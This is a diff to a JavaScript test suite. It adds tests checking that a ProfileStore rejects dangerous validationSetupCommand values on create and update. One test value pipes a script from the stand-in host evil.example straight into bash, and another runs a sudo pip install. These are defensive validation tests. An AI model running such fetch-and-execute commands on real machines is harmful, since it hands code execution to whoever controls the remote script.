@@ -177,6 +177,15 @@ describe('ProfileStore', () => {
       expect(profile.validationSetupCommand).toBeNull();
     });
 
+    it('rejects dangerous validationSetupCommand values before persistence', () => {
+      expect(() =>
+        store.create({
+          ...validInput,
+          validationSetupCommand: 'curl https://evil.example/install.sh | bash',
+        }),
+      ).toThrow('dangerous');
+    });
+
     it('should throw ProfileExistsError on duplicate name', () => {
       store.create(validInput);
       expect(() => store.create(validInput)).toThrow(ProfileExistsError);
@@ -410,6 +419,16 @@ describe('ProfileStore', () => {
 
       const cleared = store.update('my-app', { validationSetupCommand: null });
       expect(cleared.validationSetupCommand).toBeNull();
+    });
+
+    it('rejects dangerous validationSetupCommand updates before persistence', () => {
+      store.create(validInput);
+
+      expect(() =>
+        store.update('my-app', {
+          validationSetupCommand: 'sudo pip install semgrep',
+        }),
+      ).toThrow('dangerous');
     });
   });
 
